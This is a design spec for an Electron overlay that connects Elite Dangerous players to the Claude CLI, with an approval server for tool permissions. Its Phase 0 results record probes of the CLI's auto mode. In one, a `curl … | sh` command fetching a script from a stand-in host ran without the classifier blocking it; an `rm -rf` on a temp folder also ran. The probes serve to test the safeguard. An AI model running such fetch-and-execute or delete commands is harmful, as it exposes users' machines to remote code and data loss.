# Chat overlay

Date: 2026-10-23
Status: approved in conversation

Sub-project 3 of `docs/superpowers/specs/2026-10-23-overlay-roadmap-design.md`.
The code goes in a new repository (working name `pilotso11/ed-chat`). This
spec is kept in ed-mcp until that repository exists.

## Purpose

A Windows app that shows a small window on top of Elite Dangerous. The player
presses a hotkey, types a question, and presses Enter. Focus goes back to the
game at once. Claude's reply streams into a card that does not take mouse or
keyboard input. System and station names in the reply become numbered chips.
A hotkey copies a chip to the clipboard, ready to paste into the galaxy map.

## Decisions

- Windows only. Electron and TypeScript.
- The game must be in Borderless or Windowed mode. Exclusive fullscreen is not
  supported.
- Claude is the player's installed `claude` CLI, started once per session in
  stream-json mode. It uses the player's login and full configuration.
- Permission mode `auto` by default. The overlay answers the CLI's permission
  prompts with an approval card and hotkeys. Phase 0 showed that auto mode runs
  a command the player asks for explicitly without a prompt. The owner chose to
  keep `auto` as the default and to state this plainly in the README, which
  also tells players how to switch to `default` for a card on every action.
- Keyboard hotkeys only. All settings, including hotkeys, are in a settings
  file that is reloaded when it changes.

## Architecture

One Electron app. The main process does all Windows and CLI work. The renderer
(React) only draws the UI. They talk through typed IPC (`contextBridge`).

```
┌──────────────────────── Electron main ─────────────────────────┐
│  HotkeyManager ──▶ OverlayController ◀── StatusWatcher         │
│                       │      ▲                                 │
│        FocusManager ◀─┘      │ events                          │
│                          ClaudeSession ──spawn──▶ claude CLI   │
│                              ▲                         │       │
│                       ApprovalServer ◀──MCP over HTTP──┘       │
│  SettingsStore · StateStore · HistoryStore                     │
└───────────────────────────┬────────────────────────────────────┘
                            │ IPC
                  Renderer: one transparent BrowserWindow
```

| Component | Job |
|---|---|
| OverlayController | State machine over the modes below. The only code that changes window state (click-through, focusable, size, position). |
| HotkeyManager | Registers the hotkeys from settings with `globalShortcut`. Registers them only while the game or the overlay is in front, unless `hotkeys.scope` is `always`. While the overlay has focus, keys without a modifier (such as `` ` ``) are left out, so they can be typed in the chat. |
| FocusManager | Polls the foreground window every 250 ms. Saves the game window before chat opens and restores it after. Puts the overlay back on top when the game comes to the front. Uses `koffi` for Win32 calls. |
| ClaudeSession | Owns the CLI child process. Turns stream-json into internal events. The only code that knows the CLI's output format. |
| ApprovalServer | The overlay's own MCP server with one tool, `approve`. The CLI calls it for permission prompts. |
| StatusWatcher | Reads `Status.json` in the journal folder for the docked and in-danger flags. |
| SettingsStore | Reads, checks and reloads `settings.json`. |
| StateStore | Keeps state that the app writes, such as the position chosen by hotkey. |
| HistoryStore | Saves each session's transcript as JSONL in `userData\history`. The history view shows the current session from memory; the files are an archive the app does not read. |

Message flow: hotkey → FocusManager saves the game window → chat opens → Enter
→ `ClaudeSession.send()` → focus goes back to the game → the card shows the
streamed reply.

## Window

```ts
new BrowserWindow({
  transparent: true,
  frame: false,
  skipTaskbar: true,
  focusable: false,
  alwaysOnTop: true,
  resizable: false,
});
win.setAlwaysOnTop(true, "screen-saver");
win.setIgnoreMouseEvents(true, { forward: true });
```

The result is a topmost, layered, non-activating, click-through window. The
desktop window manager draws it over a borderless game. In chat mode the
window becomes focusable and stops ignoring the mouse. On Enter or Esc it goes
back.

Some games make their own borderless window topmost. Among topmost windows the
one activated last is on top. When the game comes to the front, FocusManager
calls `win.moveTop()` (`SetWindowPos(HWND_TOPMOST, …, SWP_NOACTIVATE)`). This
keeps the overlay on top without taking focus.

A visible overlay can stop the game from using independent flip, which costs
some frame time. The `toggleOverlay` hotkey hides the overlay completely.

## Modes and layout

| Mode | Click-through | Takes focus | Contents |
|---|---|---|---|
| `strip` | yes | no | Status line, pinned line, chip row |
| `card` | yes | no | The strip plus the latest reply, cut to `card.maxLines` lines; the full reply is in the chat history |
| `chat` | no | yes | History, chips that can be clicked, input box |
| `approval` | yes | no | "Claude wants to run `<tool>`" with a one-line input summary and the approve and deny hotkeys |

The resting state is the strip:

```
┌────────────────────────────────────────────┐
│ ● idle   ⚓ docked                          │  status line
│ ▸ Hip 3922 ABC, 41 ly, pad L                │  pinned line
│ [1 📋 Hip 3922]  [2 📋 Prospect Station]     │  chip row, only if there are chips
└────────────────────────────────────────────┘
```

- Status line: session state (idle, thinking, 🔧 tool name, 🛡 blocked tool,
  ⚠ error), and ⚓ docked or ⛔ in danger.
- Pinned line: the first line of the last reply. Sub-project 2 uses it for the
  next route stop.
- Chip row: stays until the next reply or `/new`.
- With `strip.lines` set to `1`, only the status line shows.

### Icon mode

`toggleIcon` (default `` ` ``) switches the resting state between the strip and
an icon: a small round badge at the same anchor. The badge shows a dot when the
last reply has chips or a notice is waiting, and ⛔ while in danger. Copy-chip
hotkeys still work in icon mode.

A reply, an approval, or opening the chat or history expands the overlay and
leaves icon mode. It does not go back to the icon by itself: only `toggleIcon`
returns to it. Notices only set the dot, so background notices do not expand it.
`toggleOverlay` still hides everything.

Icon mode is saved in `state.json` and survives a restart. `strip.startAsIcon`
sets it for the first run.

The card opens below the strip when a reply starts. At the bottom anchors it
opens above. It closes `card.fadeSeconds` after the reply ends. A new reply
replaces it. A pending approval keeps it open.

Sizes at 1920×1080 with the default 14 px font: width 420 px (about 55
characters). Strip 48 px, or about 70 px with chips. Strip and card together
are at most about 150 px. Chat shows `chat.lines` lines of history and the
input box. `style.fontSize` scales the whole window.

## Interaction

- `openChat` opens the chat with the cursor in the input box.
- Enter sends and gives focus back to the game. Shift+Enter adds a new line.
- Esc closes the chat without sending, and gives focus back.
- `/new` starts a new session.
- Send is disabled while a reply is running. `cancel` stops the reply.
- `copyChip` with digit *n* copies chip *n* of the latest reply. The chat does
  not open.
- `approve` and `deny` answer a pending approval. The chat does not open.
- When the in-danger flag is set and `safety.blockWhenInDanger` is true,
  `openChat` does nothing and the status line shows "⛔ in danger: chat
  blocked".
- When the ship is not docked, the input box shows "⚠ ship is moving".

### Copy chips

`--append-system-prompt` tells Claude to keep replies to 1–3 short lines, to put
the answer first, and to put each system or station name that the player may
paste in `⟦…⟧`. The renderer shows each marked name as a numbered chip and
shows the plain name in the text. Markers work with any tool or MCP server.
Up to 9 chips per reply get numbers.

### Position

The window has 8 anchors on a 3×3 grid around the screen: `top-left`, `top`,
`top-right`, `left`, `right`, `bottom-left`, `bottom`, `bottom-right`. There
is no center anchor. Offsets are in pixels from the anchored edges at 100%
scale. The window is placed in the work area of the chosen display.

`moveUp`, `moveDown`, `moveLeft` and `moveRight` move one step on the grid and
skip the center. From `top-right`, left gives `top`, then `top-left`.
`nextDisplay` moves to the next monitor and keeps the anchor.

While the chat is open, its status line is a drag handle. On drop, the window
snaps to the nearest anchor (by thirds of the work area; the center cell goes
to the nearest edge), with offsets that keep it where it was dropped. The
strip, card and icon stay click-through, so they cannot be dragged.

The app does not write `settings.json`. A position chosen by hotkey or drag is saved in
`state.json`. Order of precedence: a changed `position` in `settings.json`,
then `state.json`, then the defaults. When `settings.json` changes `position`,
the saved position in `state.json` is removed.

## Settings

File: `%APPDATA%\ed-chat\settings.json`. Written with the defaults on first
run. Reloaded when it changes. The file is plain JSON; the comments below only
explain the keys. Hotkeys use Electron accelerator syntax.

```jsonc
{
  "hotkeys": {
    "scope": "game",              // "game": only while the game or overlay is in front; "always"
    "openChat": "Ctrl+Shift+Space",
    "toggleOverlay": "Ctrl+Shift+O",
    "toggleIcon": "`",
    "showHistory": "Ctrl+Shift+H",
    "approve": "Ctrl+Shift+Y",
    "deny": "Ctrl+Shift+N",
    "cancel": "Ctrl+Shift+X",
    "copyChip": "Ctrl+Shift+{n}", // n = 1..9
    "moveUp": "Ctrl+Alt+Up",
    "moveDown": "Ctrl+Alt+Down",
    "moveLeft": "Ctrl+Alt+Left",
    "moveRight": "Ctrl+Alt+Right",
    "nextDisplay": "Ctrl+Alt+M"
  },
  "strip": { "lines": 2, "keepChips": true, "startAsIcon": false },
  "card": { "maxLines": 4, "fadeSeconds": 20, "width": 420 },
  "chat": { "lines": 14 },
  "style": { "fontSize": 14, "backgroundOpacity": 0.78 },
  "position": { "anchor": "bottom-left", "offsetX": 24, "offsetY": 24, "display": "primary" },
  "safety": { "blockWhenInDanger": true },
  "approval": { "timeoutSeconds": 120 },
  "claude": { "path": null, "permissionMode": "auto", "extraArgs": [] },
  "journalDir": null
}
```

- `card.maxLines`: 2 to 8. `strip.lines`: 1 or 2.
- `display`: `"primary"` or a display index (0, 1, 2…).
- `claude.path`: `null` finds `claude` on `PATH`.
- `claude.permissionMode`: `"auto"` or `"default"`.
- `journalDir`: `null` uses
  `%USERPROFILE%\Saved Games\Frontier Developments\Elite Dangerous`.

Settings are checked with zod. When the file is not valid JSON, has an unknown
key or has a value out of range, the app keeps the last good settings and the
status line shows "⚠ settings.json: <problem>". When a hotkey cannot be
registered, the status line names it and the other hotkeys still work.

## Claude session

Command:

```
claude -p --input-format stream-json --output-format stream-json
       --verbose --include-partial-messages
       --permission-mode <claude.permissionMode>
       --append-system-prompt "<reply rules>"
       --mcp-config <userData>/approval-mcp.json
       --permission-prompt-tool mcp__ed_chat__approve
       [--resume <session_id>] <claude.extraArgs>
```

- Working folder: `%APPDATA%\ed-chat\workspace`. The player's user-level
  configuration (`~/.claude`, user-scope MCP servers, plugins) applies. No
  project's `.claude/` folder applies.
- The CLI starts when the app starts, so the first message is fast. The CLI
  prints `init` only after the first message, not at start. The status line
  shows idle as soon as the process has spawned, and the ed-mcp and
  permission-mode checks run when `init` arrives with the first message.
- A new session starts when the app starts and on `/new`.
- Each message is one stdin line: `{"type":"user","message":{…}}`.
- `cancel` stops the process and starts it again with `--resume`.
- After an unexpected exit, the next message starts the process with
  `--resume`. After 3 exits in 60 seconds the app stops trying. The status line
  shows "⚠ Claude keeps stopping" and the last stderr line. `/new` or a
  restart clears this.
- At startup the app runs `claude --version`. A version older than the one the
  test fixtures came from gives a warning in the status line.

### ed-mcp check

The `init` event lists the configured MCP servers. It arrives with the first
message, so the check, and the auto-mode check, happen then. They are still starting
(`pending`) at that point and their tools are not listed yet, so the check
uses server names: `ed-mcp`, or `plugin:<plugin>:ed-mcp` for the Claude
plugin. A `pending` server counts as connecting; only absence, `failed` and
`needs-auth` are decided at `init`. `failed` shows "⚠ ed-mcp failed to start;
run claude mcp list", and `needs-auth` shows "⚠ ed-mcp needs authentication;
run claude mcp list". When there is no such server, the status line shows: "⚠ ed-mcp not connected. Run:
`claude mcp add ed-mcp -s user -- npx -y ed-mcp`". `claude mcp add` uses local
scope by default, which applies to one project folder only, so the message
names `-s user`. Chat works without ed-mcp, but without game tools.

### Events

| CLI output | Internal event |
|---|---|
| `system` / `init` | `ready{mcpServers, permissionMode}` |
| `stream_event` text delta | `text{delta}` |
| `assistant` message with `tool_use` | `toolStart{name}` |
| `user` message with `tool_result` | `toolEnd{name, isError}` |
| `result` | `result{isError, durationMs}` |
| anything else | ignored, logged at debug level |

ClaudeSession also emits `spawned` when the process starts, before any
output, and `exit`, `gaveUp` and `spawnError` for process failures.

A `tool_result` names its `tool_use_id`, not the tool. ClaudeSession keeps a
map from ID to name for `toolEnd`. The exact shapes come from the phase 0
recordings.

### Permissions and approvals

In `auto` mode a classifier reviews actions that the player's rules do not
already allow or deny. Low-risk actions run without a prompt. A blocked action
shows "🛡 blocked: <tool>" in the status line. When `init` reports a mode other
than the one requested (for example, an organization has turned auto mode
off), the status line shows "⚠ auto mode unavailable, using manual approvals".

ApprovalServer is a streamable-HTTP MCP server on `127.0.0.1`. The system picks
a free port (port 0). A bearer token is made at each launch. Both go into
`approval-mcp.json`.

1. The CLI calls `approve({tool_name, input})`.
2. The approval card shows the tool name and a one-line input summary.
3. Approve returns `{"behavior":"allow","updatedInput":input}`. Deny returns
   `{"behavior":"deny","message":"Player denied"}`.
4. With no answer after `approval.timeoutSeconds`, it denies with "Player did
   not answer".

The README suggests adding `mcp__ed-mcp__*` to the player's
`permissions.allow`.

## Errors and edge cases

The status line always shows the problem in one line. Nothing fails silently
or blocks the game.

| Case | Detection | Behavior |
|---|---|---|
| Exclusive fullscreen | `FullScreen` in the game's `Options\Graphics\DisplaySettings.xml`, read at startup and on change | Warning: "⚠ Elite is in fullscreen; switch to Borderless to see the overlay" |
| Game not running | No game window when a hotkey is pressed | Works as a desktop chat. Focus goes back to the window that was in front. |
| Focus restore refused | `SetForegroundWindow` returns false | One retry, then "⚠ click the game to refocus" |
| Saved window gone | `IsWindow` returns false | Skip the restore |
| `claude` not found | Spawn fails with `ENOENT` | "⚠ claude not found: install Claude Code or set `claude.path`" |
| Logged out, usage limit, API error | `result` with `isError`, and stderr | The card shows the CLI's message unchanged |
| `Status.json` missing or half-written | Parse fails | Keep the last good flags. With none, the state is unknown: no icon, and the in-danger block does not apply. |
| Second instance | `app.requestSingleInstanceLock()` | Bring the first instance to the front and exit |
| Display removed | `screen` events | Move to the primary display |

Logs go to `userData\logs\overlay.log`, which rotates at 5 MB and keeps 3
files. Logs contain focus failures, unknown event types (type and subtype
only), and the last CLI stderr lines on an exit, cut to 160 characters each.
Messages and replies are not logged, but stderr can quote part of a request,
and the README says so.

## Testing

### Phase 0: spike

Before app code, check these against the real CLI and game, and update this
spec with the results:

1. Stream-json shapes for text deltas, `tool_use`, `tool_result`, `result` and
   `init`. Record them as test fixtures.
2. In `auto` mode with `--permission-prompt-tool`: when the prompt tool is
   called, and what a classifier block looks like in the output.
3. Whether the game, in Borderless mode and in front, takes Ctrl+Alt and
   Ctrl+Shift hotkeys before the overlay gets them.
4. Whether `SetForegroundWindow` back to the game works after a hotkey and
   Enter.
5. The `FullScreen` values in `DisplaySettings.xml`.
6. Whether the game makes its borderless window topmost.
7. Frame time with the overlay shown and hidden, measured with PresentMon.

### Automated

vitest and prettier, as in ed-mcp.

- Pure units: OverlayController, anchor grid steps, settings parsing and
  precedence, chip parsing, `Status.json` flags, `DisplaySettings.xml`
  parsing, restart back-off with an injected clock.
- ClaudeSession against a fake `claude`: a Node script that plays back the
  recorded fixtures. Covers start, send, cancel, crash, repeated crashes and
  unknown events. CI needs no real CLI or login.
- ApprovalServer with the MCP SDK client: token check, allow, deny, timeout.
- CI: GitHub Actions on `windows-latest` runs typecheck, tests and a packaged
  build.

### Manual

A checklist in the repository, run on a Windows PC with the game before each
release:

- The overlay shows over the game in Borderless mode.
- Hotkeys work while the game is in front and not while another app is.
- Enter gives focus back to the game.
- A copied chip pastes into the galaxy map search.
- Approve and deny work by hotkey.
- The fullscreen warning shows.
- Position hotkeys work on two monitors.

## Packaging

`electron-builder` makes an NSIS installer, published on GitHub Releases.
release-please manages versions (ed-mcp releases from pushed tags instead).
The first version is not code
signed, so Windows SmartScreen warns on first run. The README says so.

## Out of scope

- Live journal in ed-mcp (sub-project 1), route HUD (sub-project 2),
  proactive triggers (sub-project 4).
- Voice, HOTAS buttons, exclusive fullscreen, Xbox Game Bar widgets.
- macOS and Linux.
- Automatic updates and code signing.
- An API-key backend. ClaudeSession has an interface for one, but there is no
  implementation.

## Open risk

Public release waits until Anthropic confirms that a published app may start
the player's logged-in `claude` CLI. See the roadmap spec.

## Phase 0 results

- CLI version used for the fixtures: 2.1.308 (Claude Code).
- stream-json shapes: the field names and nesting listed in Events hold. The recordings differ from the expected list in these ways:
  - `init` is lazy: with stdin open and idle for 12 s, the CLI printed only `hook_started` and `hook_response` lines. `init` comes after the first user message. The overlay treats a spawned process as idle, and runs the ed-mcp and permission-mode checks on the first message.
  - The first line is `system/hook_started`, not `system/init`. Several `hook_started` and `hook_response` lines come before `init`. Find `init` by type and subtype; do not assume it is line 1.
  - Other event types appear that the parser must ignore: `system/hook_started`, `system/hook_response`, `system/status`, `system/commands_changed`, `rate_limit_event`, and `stream_event` types `message_start`, `content_block_start`, `content_block_stop` and `message_delta`.
  - `content_block_delta` has more delta types than `text_delta`: `input_json_delta` (tool input), `thinking_delta` and `signature_delta`. Only `delta.type` `text_delta` carries chat text, in `event.delta.text`.
  - Every `stream_event`, `assistant` and `user` line also has `session_id`, `parent_tool_use_id` and `uuid`. `stream_event` lines also have `api_message_id`.
  - `assistant` lines hold one content block each (one line per `thinking`, `text` or `tool_use` block). The `tool_use` block also has `caller: {"type":"direct"}`. The `tool_use` block also has the full `input` (for example `command` and `description` for Bash).
  - `mcp_servers` in `init` lists every server with `name`, `status` and `source` (`user`, `plugin` or `claudeai`). At `init` time, servers have status `pending`, not `connected` (`failed` and `needs-auth` also occur). The `tools` array at `init` had no `mcp__` tools for the same reason. Do not decide "ed-mcp not connected" from `init` alone.
  - `permissionMode` in `init` is `auto` when no flag is given and `default` with `--permission-mode default`.
  - `user` lines with a `tool_result` block also have `tool_use_result` and `tool_result_meta` at the top level. A denied tool gives a `tool_result` with `is_error: true` and the denial text in `content`.
  - A denied tool also produces a `system/permission_denied` line (`tool_name`, `tool_use_id`, `message`) before the `user` line.
  - `result` has `is_error`, `duration_ms`, `result`, `session_id`, `subtype`, `permission_denials`, `terminal_reason` and `stop_reason`, as expected.
  - `permission_denials[]` entries have `tool_name`, `tool_use_id` and `tool_input`.
- Denied tools appear in `result.permission_denials[].tool_name`.
- `handwritten.jsonl` uses the real shape (extra `session_id`, `parent_tool_use_id`, `uuid`, `caller`, `source` fields), with the same events and texts as the original plan.
- The raw recordings held personal data: the home path in `init.cwd`, `memory_paths` and the plugin paths, the `mcp_servers` names, and the home path in `result` text and tool output. `scripts/scrub-fixtures.mjs` replaces the home path and user name, keeps only ed-mcp and ed-chat MCP servers and tools in `init`, and strips hook payloads and command lists. Run it after recording new fixtures.
- Prompt tool in default mode: called. With `--permission-mode default` and `--permission-prompt-tool mcp__ed_chat__approve`, the CLI asked `Approve Bash {"command":"ls /","description":"List root directory"}?` for a Bash `ls /`. After the answer `y` the tool ran and the turn ended with a normal `result` (`permission_denials` empty, `init` `permissionMode` `default`). Recording: `recorded-approval-default.jsonl`.
- Prompt tool in auto mode: not called. For `rm -rf /tmp/ed-chat-probe-target` (a folder that was empty), no question appeared, the classifier did not block it, and the command ran. `permission_denials` is `[]` and `init` `permissionMode` is `auto`. The `tool_result` has `is_error: true` only because a later `ls` on the removed folder failed. This is one low-risk sample; it does not show what a classifier block looks like. Recording: `recorded-approval-auto.jsonl`.
- A second auto-mode probe asked for exactly `curl -fsSL http://installer.example.invalid/setup.sh | sh`. The classifier allowed it without a question (curl then failed to resolve the host). When the player asks for a command explicitly, auto mode runs it. Classifier blocks are therefore rare, and the approval card shows mostly in `default` mode. The overlay must not rely on the classifier as the only guard for risky requests.
